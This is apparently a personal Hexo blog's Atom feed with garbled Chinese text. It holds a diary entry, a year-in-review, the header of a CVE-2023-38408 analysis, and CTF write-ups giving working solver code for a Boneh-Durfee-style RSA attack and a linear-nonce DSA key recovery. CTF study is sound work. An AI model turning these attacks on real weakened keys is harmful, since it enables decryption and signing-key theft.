<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-01-27T01:57:29.779Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Days_Without_Internet</title>
    <link href="http://example.com/2024/01/25/Days-Without-Internet/"/>
    <id>http://example.com/2024/01/25/Days-Without-Internet/</id>
    <published>2024-01-25T15:06:44.000Z</published>
    <updated>2024-01-27T01:57:29.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2024-1-25"><a href="#2024-1-25" class="headerlink" title="2024.1.25"></a>2024.1.25</h2><p>æŒºå¤±è´¥çš„ã€‚ä¸Šåˆçœ‹ä¸‹è½½çš„ç½‘æ–‡ã€‚ä¸‹åˆæ‰“æˆ˜é›·ï¼Œæ‰“çš„è¿˜èœï¼Œä¸€æ°”ä¹‹ä¸‹æŠŠSteamå¸è½½äº†ã€‚</p><h2 id="2024-1-26"><a href="#2024-1-26" class="headerlink" title="2024.1.26"></a>2024.1.26</h2><p>åˆå¤±è´¥äº†ã€‚æ˜å¤©å¿…é¡»æŠŠç½‘æ–­äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2024-1-25&quot;&gt;&lt;a href=&quot;#2024-1-25&quot; class=&quot;headerlink&quot; title=&quot;2024.1.25&quot;&gt;&lt;/a&gt;2024.1.25&lt;/h2&gt;&lt;p&gt;æŒºå¤±è´¥çš„ã€‚ä¸Šåˆçœ‹ä¸‹è½½çš„ç½‘æ–‡ã€‚ä¸‹åˆæ‰“æˆ˜é›·ï¼Œæ‰“çš„è¿˜èœï¼Œä¸€æ°”ä¹‹ä¸‹æŠŠSteamå¸è½½äº†ã€‚&lt;/p</summary>
      
    
    
    
    
    <category term="Other" scheme="http://example.com/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>CTF_Notes</title>
    <link href="http://example.com/2024/01/22/Chunqiu-CTF-2023/"/>
    <id>http://example.com/2024/01/22/Chunqiu-CTF-2023/</id>
    <published>2024-01-22T14:09:34.000Z</published>
    <updated>2024-01-27T01:48:59.065Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x1-Not-Wiener"><a href="#0x1-Not-Wiener" class="headerlink" title="0x1 Not Wiener"></a>0x1 Not Wiener</h1><p>é¢˜ç›®æ˜¯å˜ä½“çš„Boneh-Durfee attack, éœ€è¦åœ¨ç†è§£æ”»å‡»åŸç†ååšè°ƒæ•´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = phi - getPrime(<span class="number">540</span>)  <span class="comment"># make sure it is big enough that wiener&#x27;s attack doesn&#x27;t work</span></span><br><span class="line">e = <span class="built_in">pow</span>(d, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äº<code>d = phi - D </code> (ä»¤Dä¸º540ä½çš„éšæœºç´ æ•°)ï¼Œæ¯”æ­£å¸¸çš„å¤šäº†ä¸ªè´Ÿå·ï¼Œæ•…è¦åšä¸€äº›è°ƒæ•´ã€‚</p><p>åˆ—å‡ºRSAç­‰å¼ï¼š<br>$$<br>ed\equiv e(\phi(n)-D)\equiv-eD\equiv1\pmod\phi(n)<br>$$<br>å»æ‰mod: $-eD&#x3D;1+k\phi(n)$</p><p>ä¸¤è¾¹åŒæ—¶mod e: $-1\equiv k\phi(n)\equiv k(n-s)\pmod e$</p><p>å…¶ä¸­$s&#x3D;p+q-1â‰ˆ2\sqrt nâ‰ˆ2\sqrt e$ï¼Œkæ˜¯ä¸Då·®ä¸å¤šå¤§çš„è´Ÿæ•°ã€‚</p><p>è€ƒè™‘ä»¥ä¸‹çš„äºŒå…ƒå¤šé¡¹å¼ï¼š<br>$$<br>f(x,y) &#x3D; 1+x(n-y)<br>$$<br>å¯å¾—$f(k,s)\equiv 0\pmod e$ï¼Œæ‰€ä»¥(k, s)æ˜¯f çš„ä¸€ä¸ªå°æ ¹ï¼Œå¯ä»¥ç”¨äºŒå…ƒcopperæ¥è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">P = Zmod(ZZ(e))[<span class="string">&quot;k,s&quot;</span>]</span><br><span class="line">k, s = P.gens()</span><br><span class="line">f = <span class="number">1</span> + k * (n - s)</span><br><span class="line">rs = small_roots(f, (<span class="number">2</span>**<span class="number">540</span>, <span class="number">2</span>**<span class="number">1025</span>), m=<span class="number">4</span>, d=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line">k, s = <span class="built_in">map</span>(<span class="built_in">int</span>, rs[<span class="number">0</span>])</span><br><span class="line">phi = n - s</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="0x2-Not-Wiener-Another"><a href="#0x2-Not-Wiener-Another" class="headerlink" title="0x2 Not Wiener(Another)"></a>0x2 Not Wiener(Another)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">160</span>)</span><br><span class="line">        p = <span class="number">2</span> * getPrime(<span class="number">1024</span>-<span class="number">160</span>) * q+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    g = powmod(h,(p-<span class="number">1</span>)//q, p)</span><br><span class="line">    y=<span class="built_in">pow</span>(g,x,p)</span><br><span class="line">    <span class="keyword">return</span> p,q,g,y</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cry</span>():</span><br><span class="line">    a =</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">280</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    c = <span class="built_in">pow</span>(a, e, n)</span><br><span class="line">    <span class="keyword">return</span> n,e,c</span><br><span class="line"></span><br><span class="line">p,q,g,y=gen_key()</span><br><span class="line">k1 = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">h1 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r1 = <span class="built_in">pow</span>(g, k1, p) % q</span><br><span class="line">s1 = ((h1 + x*r1) * invert(k1, q))% q</span><br><span class="line"></span><br><span class="line">n,e,c= cry()</span><br><span class="line"></span><br><span class="line">a=</span><br><span class="line">b= <span class="number">17474742587088593627</span></span><br><span class="line">k2 = a*k1 + b</span><br><span class="line">h2 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r2 = <span class="built_in">pow</span>(g, k2, p) % q</span><br><span class="line">s2 = ((h2 + x*r2) * invert(k2, q)) % q</span><br><span class="line"><span class="built_in">print</span>(n,e,c)</span><br><span class="line"><span class="built_in">print</span>(p,q,g,y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h1:%s r1:%s s1:%s&quot;</span>%(h1,r1,s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h2:%s r2:%s s2:%s&quot;</span>%(h2,r2,s2))</span><br></pre></td></tr></table></figure><p>é¢˜ç›®åµŒå¥—äº†æ ‡å‡†Boneh-Durfee attack å’Œçº¿æ€§DSAæ”»å‡»ã€‚</p><p>ç”±cry()å‡½æ•°å¾—ä¹‹ç”¨çš„RSAåŠ å¯†çš„a, åŒæ—¶dè¾ƒå°ï¼Œç”¨æ ‡å‡†Boneh-Durfee attackå°±èƒ½æ±‚å‡ºaã€‚</p><p>æ¥ä¸‹æ¥æ˜¯æ±‚çº¿æ€§å…³ç³»çš„æ­¥éª¤ã€‚å·²çŸ¥ï¼š<br>$$<br>(h_1+xr_1)k^{-1}\equiv s_1\pmod q<br>(h_2+xr_2)(ak+b)^{-1}\equiv s_2\pmod q<br>$$<br>ä¸€é€šç›¸æ¶ˆå¾—ï¼š<br>$$<br>(s_1k-h_1)r_2-(s_2(ak+b)-h_2)r1\equiv0\pmod q<br>$$<br>å¯ä»¥æ±‚kã€‚å¾—åˆ°kå†å¸¦å…¥ä¸€ä¸ªå¼å­æ±‚xï¼Œä¹Ÿå°±æ˜¯flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a =     <span class="comment">#Boneh-Durfee</span></span><br><span class="line">p= <span class="number">161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379</span></span><br><span class="line">q= <span class="number">1115861146902610160756777713087325311747309309771</span></span><br><span class="line">g= <span class="number">61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962</span></span><br><span class="line">y= <span class="number">23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360</span></span><br><span class="line">(h1, r1, s1) = <span class="number">535874494834828755542711401117152397489711233142</span>, <span class="number">117859946800380767356190121030392492081340616512</span>, <span class="number">26966646740134065096660259687229179143947213779</span></span><br><span class="line">(h2, r2, s2) = <span class="number">236574518096866758760287021848258048065293279716</span>, <span class="number">863199000523521111517835459866422731857447792677</span>, <span class="number">517924607931342012033031470185302567344725962419</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">17474742587088593627</span></span><br><span class="line"></span><br><span class="line">k = (h1*r2-h2*r1 + b*s2*r1)*inverse(s1*r2-a*s2*r1,q) % q</span><br><span class="line">x = (k*s1 - h1)*inverse(r1,q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x))</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h1 id=&quot;0x1-Not-Wiener&quot;&gt;&lt;a href=&quot;#0x1-Not-Wiener&quot; class=&quot;headerlink&quot; title=&quot;0x1 Not Wiener&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023-Summary</title>
    <link href="http://example.com/2023/12/31/2023-Summary/"/>
    <id>http://example.com/2023/12/31/2023-Summary/</id>
    <published>2023-12-31T15:53:25.000Z</published>
    <updated>2023-12-31T17:31:48.711Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>å¤§äºŒä¸‹ä¸€å †è¯¾ï¼Œå­¦çš„æ˜¯ä¾æ‰˜ğŸ’©ã€‚å¤§ä¸‰ä¸Šçˆ½ï¼Œè¯¾å°‘ï¼Œæœ‰æ›´å¤šæ—¶é—´æ‘¸é±¼ã€‚</p><p>é€åˆ«å¤§å››ä¸¤ä½æ¯•ä¸šçš„å­¦é•¿å¸ˆå‚…ã€‚</p><blockquote><p>é•¿äº­å¤–ï¼Œå¤é“è¾¹ï¼ŒèŠ³è‰ç¢§è¿å¤©<br>æ™šé£æ‹‚æŸ³ç¬›å£°æ®‹ï¼Œå¤•é˜³å±±å¤–å±±</p><p>å¤©ä¹‹æ¶¯ï¼Œåœ°ä¹‹è§’ï¼ŒçŸ¥äº¤åŠé›¶è½<br>ä¸€ç“¢æµŠé…’å°½ä½™æ¬¢ï¼Œä»Šå®µåˆ«æ¢¦å¯’</p></blockquote><p>çœ‹çš„ä¹¦ï¼š</p><ul><li><p>ã€Šç§‘å¹»ä¸–ç•Œã€‹ä¸€æœ¬æ²¡è½ä¸‹ï¼Œè¡¥å®Œäº†ã€‚ç°åœ¨æ„Ÿè§‰å›½å†…ä¸­çŸ­ç¯‡ç§‘å¹»å†™çš„å°±æ˜¯ä¾æ‰˜ï¼Œå°±è¿ã€Šä¾å°˜ã€‹è¿™ç§å †ç Œæ–‡è—»ã€æ•°å­¦å…¬å¼æ˜¾å¾—è‡ªå·±å¾ˆç‰›é€¼çš„ä¸œè¥¿éƒ½ç«¯ä¸Šæ¥äº†ã€‚</p><blockquote><p>ä¸è¿‡SFWç§‘å¹»å¤§ä¼šå¾ˆè¿‡ç˜¾ï¼Œå¤§åˆ˜å¾ˆå’Œè”¼ä¸€è€å¤´ï¼Œä¹å‘µå‘µç»™æˆ‘ç­¾åã€‚</p><p>ç‹è¯ºè¯ºå¥½çœ‹æï¼ˆæŠ¬èµ°ï¼‰ </p></blockquote></li><li><p>ã€Šæˆ˜äº‰ä¸å’Œå¹³ã€‹ï¼šè¯»åˆ°ä¸‰å››ç™¾é¡µé¸½äº†ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´ä»å¤´è¯»ã€‚æˆ‘å°±å–œæ¬¢è¿™å‘³ï¼ä»¿ä½›èº«ä¸´å…¶å¢ƒä½“ä¼šäººç‰©çš„å–œæ€’å“€ä¹ï¼Œä¸€è¨€ä¸€è¡Œã€‚å­—é‡Œè¡Œé—´æ›´æ˜¯é‡‘å¥é¢‘å‡ºã€‚</p><blockquote><p>æ­¤ç”Ÿå¿…å»ä¸€è¶Ÿä¿„ç½—æ–¯ï¼Œè¿˜æ„¿ã€‚</p></blockquote></li><li><p>ä¸€äº›è®ºæ–‡ï¼šå°±ä¸ä¸€ä¸€è´´äº†ï¼Œæœ‰çš„çœ‹å®Œæœ‰çš„é¸½äº†ï¼Œç¬”è®°ä¹Ÿè®°çš„ç¨€ç¨€æ‹‰æ‹‰ï¼Œå¤ªæ‡’äº†ã€‚</p></li><li><p>æŠ€æœ¯æ–¹é¢ï¼šã€ŠGo è¯­è¨€ç¼–ç¨‹ä¹‹æ—…ï¼šä¸€èµ·ç”¨ Go åšé¡¹ç›®ã€‹éå¸¸å¥½Goï¼Œè®©æˆ‘çš„ä»£ç åŠ›æå‡ã€‚åŸºäºè¿™æœ¬ä¹¦å’Œé˜¿é²å¸ˆå‚…çš„æç‚¹ï¼Œç»™æˆ‘å‡ºé¢˜æä¾›äº†çµæ„Ÿå’ŒæŠ€æœ¯æ”¯æ’‘ï¼›ã€Š<em>Learn You a Haskell</em>ã€‹ï¼Œç”¨å…¬å¼å†™ç¨‹åºï¼Œéå¸¸ä¼˜é›…ä¸Šæµã€‚</p></li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">quicksort</span> :: (<span class="type">Ord</span> a) =&gt; [a] -&gt; [a]  </span><br><span class="line"><span class="title">quicksort</span> [] = []  </span><br><span class="line"><span class="title">quicksort</span> (x:xs) =   </span><br><span class="line">    <span class="keyword">let</span> smallerSorted = quicksort [a | a &lt;- xs, a &lt;= x]  </span><br><span class="line">        biggerSorted = quicksort [a | a &lt;- xs, a &gt; x]  </span><br><span class="line">    <span class="keyword">in</span>  smallerSorted ++ [x] ++ biggerSorted  </span><br></pre></td></tr></table></figure><p>èµ°çš„åœ°æ–¹ï¼š</p><ul><li>æˆéƒ½ï¼šå¤§æœ¬è¥ï¼ŒåŸºæœ¬å°±æ˜¯å­¦æ ¡ï¼ˆå­¦æ ¡é‡Œå¯å®¤-æ•™å®¤-å®éªŒå®¤ä¸‰ç‚¹ä¸€çº¿ï¼‰ï¼Œç»å¸¸å’Œç¾¤å‹åˆ°åŒ—è¡—æ°é¥­ï¼Œå¼€å‘äº†ä¸å°‘å¥½åœ°æ–¹ã€‚å¹³å®‰SRCè®²åº§+æ™šå®´ï¼Œè®²åº§éƒ½æ˜¯äºŒè¿›åˆ¶çš„ä¸œè¥¿ï¼ŒæŒ–æµè§ˆå™¨çš„æ´å¤ªå¸…äº†ï¼ˆï¼‰ï¼Œå…¶ä»–çœ‹ä¸æ‡‚ï¼ˆï¼‰ï¼Œæ™šå®´ä¸°ç››æã€‚åŠ äº†é•¿äº­çš„å¤§ä½¬vï¼Œé—®æœ‰æ— å†…æ¨ï¼Œç­”æœ€è¿‘æ²¡hcã€‚å®‰å…¨è¡Œä¸šæ„äº‘æƒ¨æ·¡ã€‚</li><li>åŒ—äº¬ï¼šå»è€çš„ï¼Œé€›èˆªåšã€‚æƒ³æŠŠé˜¿é²çº¦å‡ºæ¥åƒé¥­ï¼ŒçŠ¬å®‰å¤§å“¥ä¸å¾…è§å…„å¼ŸğŸ˜­ã€‚è·¯ä¸Šè¯¯æ‰“è¯¯æ’é—¯å…¥å¥‡å®‰ä¿¡è€çªï¼Œæ­£å€¼æŠ¤ç½‘é˜¶æ®µï¼Œé—¨å£å››ä¸ªä½¬èŠæŠ€æœ¯ï¼Œç»™ğŸ­ğŸ­å¬çš„ä¸€æ„£ä¸€æ„£çš„ã€‚</li><li>æ·±åœ³ï¼šè¡¥å¤©ç™½å¸½å¤§ä¼šã€‚è®²åº§è¯·äº†y4è®²å­—èŠ‚ç ï¼Œå¦å¤–è¿˜æœ‰å±±å¤§å¥³åšå£«è®²å®‰å“ææƒï¼Œå¿˜äº†è°è®²çš„å¼€å‘äº¤äº’å¼çš„äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å·¥å…·ã€‚æˆ‘å¸¦ç€è¿·èŒ«å»æ·±åœ³ï¼Œå¸¦ç€æ€è€ƒã€æ”¶è·ã€ä¿¡å¿ƒå›æ¥ã€‚</li><li>å“ˆå°”æ»¨ï¼šå“ˆå·¥å¤§çœŸå¤§ï¼Œè®¡ç®—æœºå­¦é™¢æœ‰ç‹¬ç«‹çš„æ¥¼ï¼ŒæŠŠğŸ­ğŸ­éœ‡æƒŠåˆ°äº†ã€‚å¸‚åŒºä¿„å‘³å¾ˆæµ“ã€‚</li><li>æ²ˆé˜³ï¼šåˆ°æ²ˆé˜³å¤§è¡—ï¼Œåšå¤§ä¿å¥ã€‚</li><li>ä¸¹ä¸œï¼šéš”ç€é¸­ç»¿æ±Ÿï¼Œçœºæœ›å…‰ä¹‹å›½ã€‚</li><li>é‡åº†ï¼šçˆ¶æ¯æ¸¸æ¯æ ¡æ‹‰ä¸ŠğŸ­ğŸ­çš„ã€‚</li></ul><p>æˆ‘æ—¶å¸¸å›å¿†èµ·22å¹´æ‰“é¹ç¨‹æ¯çš„é‚£ä¸ªå¤å¤©ï¼Œé‚£æ—¶æˆ‘ä»¬æ‰“è½¦å»èµ›åœºï¼Œé˜³å…‰æ­£å¥½ï¼Œæˆ‘ä»¬æ»¡æ€€å¯¹æœªæ¥çš„æ†§æ†¬ã€‚å¦‚ä»Šäººèµ°äººç•™ï¼Œæœ‰å¤±æœ‰å¾—ï¼Œè®©æˆ‘æ¯æ¯å›æƒ³æ— è¯­å‡å™ã€‚è€Œ<strong>2023å¹´</strong>ï¼Œå°±åƒä¸€ä¸ªé•¿é•¿çš„å‡æœŸï¼Œä¸ŠåŠå¹´ç´§å¼ çš„æ”¾å‡ï¼Œä¸‹åŠå¹´æ‚ é—²çš„æ”¾å‡ã€‚æˆ‘èµ°äº†å¾ˆå¤šåœ°æ–¹ï¼Œä½†çœŸæ­£ç•™åœ¨æˆ‘å¿ƒåº•çš„ç¾æ™¯å°±é‚£ä¹ˆå‡ ä¸ªï¼›è®¤è¯†äº†å¾ˆå¤šäººï¼Œä¹Ÿå› ä¸ºè‡ªèº«æˆ–å¤–éƒ¨åŸå› ä¸ä»–ä»¬æ–­äº†è”ç³»ï¼›å‚ä¸äº†å¾ˆå¤šäº‹æƒ…ï¼Œæœ‰äº›æçš„å¥½ï¼Œä¸è¿‡å¥½å¤šè¿˜æ˜¯æ²¡æå¥½ã€‚åœ¨è¿·èŒ«ä¸­æŒ£æ‰æ±‚å˜ï¼Œä¸Šä¸‹æ±‚ç´¢å°±æ˜¯æˆ‘2023çš„æœ€å¥½ç”»åƒã€‚</p><p>å°±è¿™æ ·å§ï¼Œå¸Œæœ›<strong>2024</strong>å˜å¾—æ›´å¥½ã€‚</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401010131505.png" alt="image-20240101013133418"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;å¤§äºŒä¸‹ä¸€å †è¯¾ï¼Œå­¦çš„æ˜¯ä¾æ‰˜ğŸ’©ã€‚å¤§ä¸‰ä¸Šçˆ½ï¼Œè¯¾å°‘ï¼Œæœ‰æ›´å¤šæ—¶é—´æ‘¸é±¼ã€‚&lt;/p&gt;
&lt;p&gt;é€åˆ«å¤§å››ä¸¤ä½æ¯•ä¸šçš„å­¦é•¿å¸ˆå‚…ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;é•¿äº­å¤–ï¼Œå¤é“è¾¹ï¼ŒèŠ³è‰ç¢§è¿å¤©&lt;br</summary>
      
    
    
    
    
    <category term="other" scheme="http://example.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-38408-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/</id>
